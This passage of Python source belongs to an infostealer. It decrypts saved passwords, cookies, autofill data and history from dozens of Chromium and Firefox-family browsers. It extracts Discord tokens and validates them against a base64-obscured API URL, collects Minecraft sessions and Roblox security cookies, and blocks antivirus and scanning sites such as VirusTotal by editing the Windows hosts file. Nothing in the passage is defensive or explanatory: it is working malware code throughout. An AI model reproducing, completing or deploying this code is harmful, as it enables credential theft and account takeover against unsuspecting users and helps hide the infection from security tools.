            'DuckDuckGo': {'path': localappdata + '\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView', 'localstate': localappdata + '\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView\\Local State'},
            'Comodo': {'path': localappdata + '\\Comodo\\Dragon\\User Data', 'localstate': localappdata + '\\Comodo\\Dragon\\User Data\\Local State'},
            'Avast': {'path': localappdata + '\\AVAST Software\\Browser\\User Data', 'localstate': localappdata + '\\AVAST Software\\Browser\\User Data\\Local State'},
            'Epic': {'path': localappdata + '\\Epic Privacy Browser\\User Data', 'localstate': localappdata + '\\Epic Privacy Browser\\User Data\\Local State'},
            'Thorium': {'path': localappdata + '\\Thorium\\User Data', 'localstate': localappdata + '\\Thorium\\User Data\\Local State'}, 
            "Blisk": {'path': localappdata + '\\Blisk\\User Data', 'localstate': localappdata + '\\Blisk\\User Data\\Local State'},
            'Cromite': {'path': localappdata + '\\Cromite\\User Data', 'localstate': localappdata + '\\Cromite\\User Data\\Local State'},
            'Edge': {'path': localappdata + '\\Microsoft\\Edge\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge\\User Data\\Local State'},
            'Edge SxS': {'path': localappdata + '\\Microsoft\\Edge SxS\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge SxS\\User Data\\Local State'},
            'Edge Dev': {'path': localappdata + '\\Microsoft\\Edge Dev\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge Dev\\User Data\\Local State'},
            'Brave': {'path': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data', 'localstate': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Local State'},
            'Opera': {'path': appdata + '\\Opera Software\\Opera Stable', 'localstate': appdata + '\\Opera Software\\Opera Stable\\Local State'},
            'Opera GX': {'path': appdata + '\\Opera Software\\Opera GX Stable', 'localstate': appdata + '\\Opera Software\\Opera GX Stable\\Local State'},
            'Opera Air': {'path': appdata + '\\Opera Software\\Opera Air Stable', 'localstate': appdata + '\\Opera Software\\Opera Air Stable\\Local State'},
            'Vivaldi': {'path': localappdata + '\\Vivaldi\\User Data', 'localstate': localappdata + '\\Vivaldi\\User Data\\Local State'},
            }
            
        for name, path in chromium_paths.items():
            userdata = path['path']
            local_state = path['localstate']
            profiles = []
            if not os.path.exists(userdata):
                continue
            for prffl in os.listdir(userdata):
                if prffl.lower() == 'default' or prffl.lower().startswith('profile'):
                    profiles.append(prffl)
                    
            master_key = get_master_key(local_state)
            
            for profile in profiles:
                os.makedirs(os.path.join(output, name, profile), exist_ok=True)
                cookieoutput = os.path.join(output, name, profile, 'Cookies.txt')
                passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
                autofilloutput = os.path.join(output, name, profile, 'Autofill.txt')
                historyoutput = os.path.join(output, name, profile, 'History.txt')
                
                profile_path = os.path.join(userdata, profile)
                #print(profile_path)
                
                cookie_path = os.path.join(profile_path, 'Network', 'Cookies')
                if not os.path.exists(cookie_path):
                    cookie_path = os.path.join(profile_path, 'Cookies')
                password_path = os.path.join(profile_path, 'Login Data')
                autofill_path = os.path.join(profile_path, 'Web Data')
                history_path = os.path.join(profile_path, 'History')
                if os.path.exists(autofill_path):
                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                    shutil.copy2(autofill_path, tmpdir)
                    con = sqlite3.connect(tmpdir)
                    cur = con.cursor()
                    cur.execute("SELECT name, value FROM autofill")
                    try:
                        for autofillname, val in cur.fetchall():
                            line = f"Name: {autofillname} \nValue: {val}\n---------------------------------\n"
                            write(autofilloutput, line)
                            autofill_count += 1
                    except Exception as e:
                        pass
                    cur.close()
                    con.close()
                    removefile(tmpdir)
                    
                if os.path.exists(cookie_path):
                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                    try:
                        shutil.copy2(cookie_path, tmpdir)
                        con = sqlite3.connect(tmpdir)
                        cur = con.cursor()
                        cur.execute("SELECT host_key, name, path, encrypted_value, is_secure, expires_utc FROM cookies")
                        try:
                            for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
                                expiry = converttounix(expiry)
                                if value.startswith(b'v10') or value.startswith(b'v11'):
                                    line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{decrypt_password(value, master_key)}\n"
                                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|' in line:
                                        rblx_cookies.add(line)
                                    write(cookieoutput, line)
                                    cookie_count += 1
                                elif value.startswith(b'v20'):
                                    pass
                                else:
                                    line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{decrypt_old(value)}\n"
                                    rblx_cookies.add(line)
                                    write(cookieoutput, line)
                                    cookie_count += 1
                        except Exception as e:
                           pass
                        cur.close()
                        con.close()
                        removefile(tmpdir)
                    except:
                        pass
                   
                if os.path.exists(password_path):
                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                    shutil.copy2(password_path, tmpdir)
                    con = sqlite3.connect(tmpdir)
                    cur = con.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    try:
                        for host, c0name, value in cur.fetchall():
                            if c0name and value:
                                if value.startswith(b'v10') or value.startswith(b'v11'):
                                    line = f"URL: {host}\nUsername: {c0name}\nPassword: {decrypt_password(value, master_key)}\n---------------------------------\n"
                                    write(passwordoutput, line)
                                    password_count += 1
                                elif value.startswith(b'v20'):
                                    pass
                                else:
                                    line = f"URL: {host}\nUsername: {c0name}\nPassword: {decrypt_old(value)}\n---------------------------------\n"
                                    write(passwordoutput, line)
                                    password_count += 1

                    except Exception as e:
                        pass
                    cur.close()
                    con.close()
                    removefile(tmpdir)
                   
                if os.path.exists(history_path):
                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                    shutil.copy2(history_path, tmpdir)
                    con = sqlite3.connect(tmpdir)
                    cur = con.cursor()
                    cur.execute("SELECT url, title, visit_count FROM urls")
                    try:
                        for w3url, w3name, w3visit in cur.fetchall():
                            line = f"Name: {w3name}\nURL: {w3url}\nVisits: {w3visit}\n---------------------------------\n"
                            write(historyoutput, line)
                            browsing_history += 1
                    except Exception as e:
                        pass
                    cur.close()
                    con.close()
                    removefile(tmpdir)

def stealchromiumv20():
    global cookie_count
    global password_count
    global rblx_cookies

    if config.browsers:
        chromium_paths = {
            'Chrome': {'path': localappdata + '\\Google\\Chrome\\User Data', 'localstate': localappdata + '\\Google\\Chrome\\User Data\\Local State', 'key': 'Google Chromekey1'},
            'Chromium': {'path': localappdata + '\\Chromium\\User Data', 'localstate': localappdata + '\\Chromium\\User Data\\Local State', 'key': 'Chromiumkey1'},
            'Cent Browser': {'path': localappdata + '\\CentBrowser\\User Data', 'localstate': localappdata + '\\CentBrowser\\User Data\\Local State', 'key': 'CentBrowserkey1'},
            'Yandex': {'path': localappdata + '\\Yandex\\YandexBrowser\\User Data', 'localstate': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Local State', 'key': 'Yandexkey1'},
            'Edge': {'path': localappdata + '\\Microsoft\\Edge\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge\\User Data\\Local State', 'key': 'Microsoft Edgekey1'},
            'Brave': {'path': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data', 'localstate': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Local State', 'key': 'Brave Softwarekey1'},
            'Opera': {'path': appdata + '\\Opera Software\\Opera Stable', 'localstate': appdata + '\\Opera Software\\Opera Stable\\Local State', 'key': 'Opera Softwarekey1'},
            'Opera GX': {'path': appdata + '\\Opera Software\\Opera GX Stable', 'localstate': appdata + '\\Opera Software\\Opera GX Stable\\Local State', 'key': 'Opera Softwarekey1'},
            'Opera Air': {'path': appdata + '\\Opera Software\\Opera Air Stable', 'localstate': appdata + '\\Opera Software\\Opera Air Stable\\Local State', 'key': 'Opera Softwarekey1'},
            'Vivaldi': {'path': localappdata + '\\Vivaldi\\User Data', 'localstate': localappdata + '\\Vivaldi\\User Data\\Local State', 'key': 'Vivaldikey1'},
            'Escosia': {'path': localappdata + '\\EscosiaBrowser\\User Data', 'localstate': localappdata + '\\EscosiaBrowser\\User Data\\Local State', 'key': 'Escosiabrowserkey1'},
            'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State', 'key': 'Holakey1'},
            }

        for name, path in chromium_paths.items():
            userdata = path['path']
            local_state = path['localstate']
            ncryptkey = path['key']
            profiles = []
            if not os.path.exists(userdata):
                continue
            for prffl in os.listdir(userdata):
                if prffl.lower() == 'default' or prffl.lower().startswith('profile'):
                    profiles.append(prffl)

            for profile in profiles:
                os.makedirs(os.path.join(output, name, profile), exist_ok=True)
                cookieoutput = os.path.join(output, name, profile, 'Cookies.txt')
                passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
                
                profile_path = os.path.join(userdata, profile)

                cookie_path = os.path.join(profile_path, 'Network', 'Cookies')
                password_path = os.path.join(profile_path, 'Login Data')
                
                master_key = get_master_keyv2(local_state, ncryptkey)

                if os.path.exists(cookie_path):
                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                    try:
                        shutil.copy2(cookie_path, tmpdir)
                        con = sqlite3.connect(tmpdir)
                        cur = con.cursor()
                        cur.execute("SELECT host_key, name, path, encrypted_value, is_secure, expires_utc FROM cookies")
                        try:
                            for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
                                expiry = converttounix(expiry)

                                decrypted = decrypt_v20_value(value, master_key)
                                if decrypted is not None:
                                    line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{decrypted}\n"
                                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|' in line:
                                        rblx_cookies.add(line)
                                    write(cookieoutput, line)
                                    cookie_count += 1
                        except Exception as e:
                            pass
                        cur.close()
                        con.close()
                        removefile(tmpdir)
                    except:
                        pass
                   
                if os.path.exists(password_path):
                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                    shutil.copy2(password_path, tmpdir)
                    con = sqlite3.connect(tmpdir)
                    cur = con.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    try:
                        for host, c0name, value in cur.fetchall():
                            if c0name and value:
                                decrypted = decrypt_v20_password(value, master_key)
                                if decrypted is not None:
                                    line = f"URL: {host}\nUsername: {c0name}\nPassword: {decrypted}\n---------------------------------\n"
                                    write(passwordoutput, line)
                                    password_count += 1
                    except Exception as e:
                        pass
                    cur.close()
                    con.close()
                    removefile(tmpdir)
                   
    
def stealgecko():
    global cookie_count
    global password_count
    global browsing_history
    global autofill_count
    global rblx_cookies
    if config.browsers:
        gecko_paths = {
            "Firefox": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Mozilla Firefox\\nss3.dll"},
            #"Firefox Developer Edition": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Firefox Developer Edition\\nss3.dll"},
            "Waterfox": {"path": appdata + "\\Waterfox\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"},
            "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": localappdata + "\\Mullvad\\MullvadBrowser\\Release\\nss3.dll"}, 
            "Zen": {"path": appdata + "\\zen\\Profiles", "nss": "C:\\Program Files\\Zen Browser\\nss3.dll"}, 
            "SeaMonkey": {"path": appdata + "\\Mozilla\\SeaMonkey\\Profiles", "nss": "C:\\Program Files\\SeaMonkey\\nss3.dll"},
            "K-Meleon": {"path": appdata + "\\K-Meleon\\Profiles", "nss": "C:\\Program Files\\K-Meleon\\nss3.dll"},
            "Pale Moon": {"path": appdata + "\\Moonchild Productions\\Pale Moon\\Profiles", "nss": "C:\\Program Files\\Pale Moon\\nss3.dll"},
            "Basilisk": {"path": appdata + "\\Moonchild Productions\\Basilisk\\Profiles", "nss": "C:\\Program Files\\Basilisk\\nss3.dll"},
            "LibreWolf": {"path": appdata + "\\LibreWolf\\Profiles", "nss": "C:\\Program Files\\LibreWolf\\nss3.dll"},
            "IceWeasel": {"path": appdata + "\\IceWeasel\\Profiles", "nss": "C:\\Program Files (x86)\\IceWeasel\\nss3.dll"},
        }
        for name, path in gecko_paths.items():
            nss = path['nss']
            userdata = path['path']
            profiles = []
            if not os.path.exists(userdata):
                continue
            for prffl in os.listdir(userdata):
                if os.path.exists(os.path.join(userdata, prffl, 'cookies.sqlite')):
                    profiles.append(prffl)
            
            for profile in profiles:
                os.makedirs(os.path.join(output, name, profile), exist_ok=True)
                cookieoutput = os.path.join(output, name, profile, 'Cookies.txt')
                passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
                autofilloutput = os.path.join(output, name, profile, 'Autofill.txt')
                historyoutput = os.path.join(output, name, profile, 'History.txt')
    
                profile_path = os.path.join(userdata, profile)
                cookie_path = os.path.join(profile_path, 'cookies.sqlite')
                password_path = os.path.join(profile_path, 'logins.json')
                autofill_path = os.path.join(profile_path, 'formhistory.sqlite')
                history_path = os.path.join(profile_path, 'places.sqlite')
                
                if os.path.exists(cookie_path):
                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                    try:
                        shutil.copy2(cookie_path, tmpdir)
                        con = sqlite3.connect(tmpdir)
                        cur = con.cursor()
                        cur.execute("SELECT host, name, path, value, isSecure, expiry FROM moz_cookies")
                        try:
                            for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
                                expiry = converttounixfirefox(expiry)
                                line = f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{c0path}\t{'TRUE' if c0secure else 'FALSE'}\t{expiry}\t{c0name}\t{value}\n"
                                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|' in line:
                                    rblx_cookies.add(line)

                                write(cookieoutput, line)
                                cookie_count += 1
                        except Exception as e:
                            pass
                        cur.close()
                        con.close()
                        removefile(tmpdir)
                    except:
                        pass
                       
                if os.path.exists(password_path):
                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                    try:
                        shutil.copy2(password_path, tmpdir)
                        _nss3 = load_nss(profile_path, nss)
                        
                        if _nss3:
                            with open(tmpdir, 'r', encoding='utf-8') as f:
                                lgns = json.load(f).get('logins', [])
                               
                            for login in lgns:
                                host = login.get('hostname', '')
                                Cusername = decrypt_firefox_password(_nss3, login.get('encryptedUsername', ''))
                                Cpassword = decrypt_firefox_password(_nss3, login.get('encryptedPassword', ''))
                                if Cusername and Cpassword:
                                    line = f"URL: {host}\nUsername: {Cusername}\nPassword: {Cpassword}\n---------------------------------\n"
                                    write(passwordoutput, line)
                                    password_count += 1
                        removefile(tmpdir)
                    except Exception as e:
                        pass
                
                if os.path.exists(history_path):
                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                    try:
                        shutil.copy2(history_path, tmpdir)
                        con = sqlite3.connect(tmpdir)
                        cur = con.cursor()
                        cur.execute("SELECT url, title, visit_count FROM moz_places")
                        try:
                            for w3url, w3name, w3visit in cur.fetchall():
                                line = f"Name: {w3name}\nURL: {w3url}\nVisits: {w3visit}\n---------------------------------\n"
                                write(historyoutput, line)
                                browsing_history += 1
                        except Exception as e:
                            pass
                        cur.close()
                        con.close()
                        removefile(tmpdir)
                    except Exception as e:
                       pass
                       
                if os.path.exists(autofill_path):
                    tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                    try:
                        shutil.copy2(autofill_path, tmpdir)
                        con = sqlite3.connect(tmpdir)
                        cur = con.cursor()
                        cur.execute("SELECT fieldname, value FROM moz_formhistory")
                        try:
                            for autofillname, val in cur.fetchall():
                                line = f"Name: {autofillname} \nValue: {val}\n---------------------------------\n"
                                write(autofilloutput, line)
                                autofill_count += 1
                        except Exception as e:
                            pass
                        cur.close()
                        con.close()
                        removefile(tmpdir)
                    except Exception as e:
                       pass


def stealdiscord(): #stole this from my token stealer 
    tokens = set()
    
    regex1 = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
    regex2 = r"dQw4w9WgXcQ:[^\"]*"

    roaming = os.getenv('appdata')
    local = os.getenv('localappdata')
    
    paths = {
    '0Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
    '0ChromeSxS': os.path.join(local, 'Google', 'Chrome SxS', 'User Data'),
    '0Comet': os.path.join(local, 'Perplexity', 'Comet', 'User Data'),
    '0ChromeBeta': os.path.join(local, 'Google', 'Chrome Beta', 'User Data'),
    '0ChromeDev': os.path.join(local, 'Google', 'Chrome Dev', 'User Data'),
    '0Amigo': os.path.join(local, 'Amigo', 'User Data'),
    '0Avast': os.path.join(local, 'AVAST Software', 'Browser', 'User Data'),
    '0Chromium': os.path.join(local, 'Chromium', 'User Data'),
    '0AVG': os.path.join(local, 'AVG', 'Browser', 'User Data'),
    '0Supermium': os.path.join(local, 'Supermium', 'User Data'),
    '0Escosia': os.path.join(local, 'EscosiaBrowser', 'User Data'), #FUCK THE POLAR BEARS
    '0Cent': os.path.join(local, 'CentBrowser', 'User Data'),
    '0Comodo': os.path.join(local, 'Comodo', 'Dragon', 'User Data'),
    '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
    '0Helium': os.path.join(local, 'imput', 'Helium', 'User Data'),
    '0Thorium': os.path.join(local, 'Thorium', 'User Data'),
    '0SamsungInternet': os.path.join(local, 'Samsung', 'Internet', 'User Data'),
    '0Cromite': os.path.join(local, 'Cromite', 'User Data'),
    '0Shift': os.path.join(local, 'Shift', 'User Data'),
    '0WaveBrowser': os.path.join(local, 'WaveBrowser', 'User Data'),
    '0CocCoc': os.path.join(local, 'CocCoc', 'Browser', 'User Data'),
    '0Hola': os.path.join(roaming, 'Hola', 'chromium_profile'),
    '0Iridium': os.path.join(local, "Iridium", "User Data"),
    '0Vivaldi': os.path.join(local, 'Vivaldi', 'User Data'),
    '0Yandex': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data'),
    '0Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
    '0EdgeSxS': os.path.join(local, 'Microsoft', 'Edge SxS', 'User Data'),
    '0EdgeDev': os.path.join(local, 'Microsoft', 'Edge Dev', 'User Data'),
    '0Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    '1Discord': os.path.join(roaming, 'discord'),
    '1DiscordPTB': os.path.join(roaming, 'discordptb'),
    '1DiscordCanary': os.path.join(roaming, 'discordcanary'),
    '1DiscordDevelopment': os.path.join(roaming, 'discorddevelopment'),
    '1Lightcord': os.path.join(roaming, 'Lighcord'),
    '2OperaOld': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
    '2Operanew': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Default', 'Local Storage', 'leveldb'),
    '2OperaGXOld': os.path.join(roaming, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
    '2DuckDuckGo': os.path.join(local, 'Packages', 'DuckDuckGo.DesktopBrowser_ya2fgkz3nks94', 'LocalState', 'EBWebView', 'Default', 'Local Storage', 'leveldb'),
    '2OperaGXNew': os.path.join(roaming, 'Opera Software', 'Opera GX Stable', 'Default', 'Local Storage', 'leveldb'),
    '2OperaAir': os.path.join(roaming, 'Opera Software', 'Opera Air Stable', 'Default', 'Local Storage', 'leveldb'),
    '2Legcord': os.path.join(roaming, 'legcord', 'Local Storage', 'leveldb'),
    '2Vesktop': os.path.join(roaming, 'vesktop', 'sessionData', 'Local Storage', 'leveldb'),
    '3FireFox': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles'),
    '3WaterFox': os.path.join(roaming, 'Waterfox', 'Profiles'),
    '3LibreWolf': os.path.join(roaming, 'LibreWolf', 'Profiles'),
    '3Zen': os.path.join(roaming, 'zen', 'Profiles'),
    '3Mullvad': os.path.join(roaming, 'Mullvad', 'MullvadBrowser', 'Profiles'),
    '4Mypal': os.path.join(roaming, 'Mypal68', 'Profiles'),
    }
    for browser, path in paths.items():
        if not os.path.exists(path):
            continue
            
        if browser.startswith('0'):
            ps = os.listdir(path)
            for prof in ps:
                if prof.lower() == 'default' or prof.lower().startswith('profile'):
                    pr_path = os.path.join(path, prof)
                    ldb = os.path.join(pr_path, 'Local Storage', 'leveldb')                    
                    tkdb = os.listdir(ldb)
                    for file in tkdb:
                        if not file.endswith('.log') and not file.endswith('.ldb'):
                            continue
                        else:
                            fn = os.path.join(ldb, file)
                            try:
                                with open(fn, errors="ignore", encoding="utf-8") as f:
                                    gnw = f.read()
                                    match = re.findall(regex1, gnw)
                                    for m in match:
                                        tokens.add(m)
                            except:
                                pass
        elif browser.startswith('1'):
            local_state = os.path.join(path, 'Local State')
            key = get_master_key(local_state)
            
            ldb = os.path.join(path, 'Local Storage', 'leveldb')
            tkdb = os.listdir(ldb)
            for file in tkdb:
                fn = os.path.join(ldb, file)
                try:
                    with open(fn, errors="ignore", encoding="utf-8") as f:
                        gnw = f.read()
                        match = re.findall(regex2, gnw)
                        if match:
                            for m in match:
                                enc = m.split('dQw4w9WgXcQ:')[1]
                                enc = base64.b64decode(enc)
                                t = decrypt_password(enc, key)
                                if not t is None:
                                   tokens.add(t)
                except:
                    pass
                            
        elif browser.startswith('2'):
            tkdb = os.listdir(path)
            for file in tkdb:
                if not file.endswith('.log') and not file.endswith('.ldb'):
                    continue
                else:
                    fn = os.path.join(path, file)
                    try:
                        with open(fn, errors="ignore", encoding="utf-8") as f:
                            gnw = f.read()
                            match = re.findall(regex1, gnw)
                            for m in match:
                                tokens.add(m)
                    except:
                        pass
        elif browser.startswith('3'):
            prof = os.listdir(path)
            for profpth in prof:
                ldb = os.path.join(path, profpth, 'storage', 'default')
                if not os.path.exists(ldb):
                    continue
                for discord in ['https+++discord.com', 'https+++canary.discord.com', 'https+++ptb.discord.com']:
                    tkdb = os.path.join(ldb, discord, 'ls', 'data.sqlite')
                    if not os.path.exists(tkdb):
                        continue
                    try:
                        with open(tkdb, errors="ignore", encoding="utf-8") as f:
                            gnw = f.read()
                            match = re.findall(regex1, gnw)
                            for m in match:
                                tokens.add(m)
                    except:
                        pass

        elif browser.startswith('4'):
            prof = os.listdir(path)
            for profpth in prof:
                tkdb = os.path.join(path, profpth, 'webappstore.sqlite')
                if not os.path.exists(tkdb):
                    continue
                try:
                    with open(tkdb, errors="ignore", encoding="utf-8") as f:
                        gnw = f.read()
                        match = re.findall(regex1, gnw)
                        for m in match:
                            tokens.add(m)
                except:
                    pass


    return tokens
    
def accountdate(id):
    de = 1420070400000
    time = ((int(id) >> 22) + de) / 1000
    date = datetime.utcfromtimestamp(time)
    return date.strftime('%Y-%m-%d %H:%M:%S') + ' ' + 'UTC Timezone' 


def verify(token):
    headers = {
    'authorization': token,
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0'
    }
    v = requests.get(base64.b64decode('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1l').decode('utf-8'), headers=headers)
    if v.status_code in [200, 201, 204]:
        return v.json()
    else:
        return False

def stealdiscordacc():
    if config.discordacc:
        global discord_accounts
        discordtokens = stealdiscord()

        d_output = os.path.join(output, 'Discord')
        discordoutput = os.path.join(output, 'Discord', 'DiscordAccounts.txt')
        os.makedirs(d_output, exist_ok=True)
        for token in discordtokens:
            headers = {
            'authorization': token,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0'
            }
            valid = verify(token)
            if valid:
                discord_accounts += 1
                userinfo = valid
                username = userinfo.get('username', "N/A")
                email = userinfo.get('email', "N/A")
                nitro = "True" if userinfo.get("premium_type") else "False"
                user_id = userinfo.get('id')
                avatar = userinfo.get('avatar')
                phone = userinfo.get('phone', "N/A")
                bio = userinfo.get('bio') or "None"
                mfa = "True" if userinfo.get("mfa_enabled") else "False"
                locale = userinfo.get('locale')
                pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}?size=1024" if avatar else "None"

                line_ = f"""Token: {token}
User ID: {user_id}
Account Created: {accountdate(user_id)}
Username: {username}
E-mail: {email}
Phone Number: {phone}
Bio: {bio}
PFP: {pfp}
MFA: {mfa}
Nitro: {nitro}
=====================================
"""
                write(discordoutput, line_)

def collectminecraft():
    if config.games:
        global minecraft_sessions
        minecraftoutput = os.path.join(output, 'Minecraft Sessions')
        userprofile = os.getenv('userprofile')
        appdata = os.getenv('appdata')
        mcpaths = {
        'Tlauncher': os.path.join(appdata, '.minecraft', 'TlauncherProfiles.json'),
        'Minecraft Launcher Old': os.path.join(appdata, '.minecraft', 'launcher_accounts.json'),
        'Minecraft Launcher': os.path.join(appdata, '.minecraft', 'launcher_accounts_microsoft_store.json'),
        'Prism Launcher': os.path.join(appdata, 'PrismLauncher', 'accounts.json'),
        'Lunar Client': os.path.join(userprofile, '.lunarclient', 'settings', 'game', 'accounts.json'),
        }
        for name, path in mcpaths.items():
            if os.path.exists(path):
                try:
                    os.makedirs(os.path.join(minecraftoutput, name), exist_ok=True)
                    shutil.copy2(path, os.path.join(minecraftoutput, name, os.path.basename(path)))
                    minecraft_sessions += 1
                except:
                    continue
        modrinth_files = [
            os.path.join(appdata, "ModrinthApp", "app.db"),
            os.path.join(appdata, "ModrinthApp", "app.db-shm"),
            os.path.join(appdata, "ModrinthApp", "app.db-wal")
        ]
        modrn = 0
        for file_ in modrinth_files:
            if os.path.exists(file_):
                try:
                    os.makedirs(os.path.join(minecraftoutput, 'Modrinth'), exist_ok=True)
                    modrn += 1
                except:
                    pass
        if modrn == 3:
            minecraft_sessions += 1

def collectroblox():
    if config.games:
        global roblox_cookies
        robloxoutput = os.path.join(output, 'Roblox Cookies')
        
        localappdata = os.getenv('localappdata')
        cookiepath = os.path.join(localappdata, 'Roblox', 'LocalStorage', 'RobloxCookies.dat')
        if os.path.exists(cookiepath):
            tmpdir = os.path.join(os.getenv('temp'), randstr(12))
            try:
                os.makedirs(robloxoutput, exist_ok=True)
                shutil.copy2(cookiepath, tmpdir)
                with open(tmpdir, 'r', encoding='utf-8') as f:
                    jsondata = json.load(f)
                    enc_cookies = jsondata.get('CookiesData', '')
                    if enc_cookies:
                        decrypted = base64.b64decode(enc_cookies)
                        decrypted = decrypt_old(decrypted)
                        decrypted_list = decrypted.split(";")
                        for cookie in decrypted_list:
                            if '.ROBLOSECURITY' in cookie:
                                print(cookie.strip())
                                write(os.path.join(robloxoutput, 'Cookies.txt'), cookie.strip() + '\n')
                                roblox_cookies += 1

            except Exception as e:
                print(e)
                pass
        print(rblx_cookies)
        for rblxcookie in rblx_cookies:
            write(os.path.join(robloxoutput, 'Cookies.txt'), rblxcookie.strip() + '\n')
            roblox_cookies += 1



        
def blockwebsite(url):
    try:
        with open(os.path.join(os.getenv('systemroot'), 'System32', 'drivers', 'etc', 'hosts'), 'a') as f:
            f.write(f"0.0.0.0 {url}\n")
    except Exception as e:
        pass

def blockantivirus():
    if config.blocksites:
        with open(os.path.join(os.getenv('systemroot'), 'System32', 'drivers', 'etc', 'hosts'), 'r') as f:
            existing_hosts = f.read()

        language_codes = ["en", "es", "de", "fr", "ru", "zh", "ja", "ko", "pt", "hi", "it", "ar", "nl", "sv", "no", "fi", "da", "pl", "tr"]
        country_codes = ["us", "gb", "de", "fr", "ru", "cn", "jp", "kr", "br", "in", "it", "es", "ca", "au", "nl", "se", "ch", "be", "dk", "app"]
        avwebsites = ['avast.com', 'avg.com', 'malwarebytes.com', 'kaspersky.com', 'norton.com', 'bitdefender.com', 'mcafee.com', 'trendmicro.com', 'sophos.com', 'avira.com', 'f-secure.com', 'panda.com', 'webroot.com', 'eset.com', 'adaware.com', 'zonealarm.com', 'virustotal.com', 'virustotal.com/gui/home/upload', 'virustotal.com/gui/home/url', 'virustotal.com/gui/home/search', 'metadefender.com', 'jotti.org', 'analyze.phishtank.com', 'urlscan.io', 'hybrid-analysis.com', 'any.run', 'malshare.com']
        if 'SIXkssvenKirksjsdkajdaskd.6741' in existing_hosts and len(existing_hosts.splitlines()) > 10000 and any(site in existing_hosts for site in avwebsites) in existing_hosts:
            return
        for site in avwebsites:
            blockwebsite(site)
            for languagecode in language_codes:
                blockwebsite(f'{languagecode}.{site}')
            for countrycode in country_codes:
                blockwebsite(f'{countrycode}.{site}')
            for languagecode in language_codes:
                for countrycode in country_codes:
                    blockwebsite(f'{site}/{languagecode}/{countrycode}')
                    blockwebsite(f'{site}/{countrycode}/{languagecode}')
                    blockwebsite(f'{site}/{languagecode}-{countrycode}')
                    blockwebsite(f'{site}/{countrycode}-{languagecode}')
            blockwebsite('SIXkssvenKirksjsdkajdaskd.6741')
            blockwebsite('www.' + site)
            for languagecode in language_codes:
                blockwebsite(f'www.{languagecode}.{site}')
            for countrycode in country_codes:
                blockwebsite(f'www.{countrycode}.{site}')
            for languagecode in language_codes:
                for countrycode in country_codes:
                    blockwebsite(f'www.{site}/{languagecode}/{countrycode}')
                    blockwebsite(f'www.{site}/{countrycode}/{languagecode}')
                    blockwebsite(f'www.{site}/{languagecode}-{countrycode}')
                    blockwebsite(f'www.{site}/{countrycode}-{languagecode}')


def makepath():
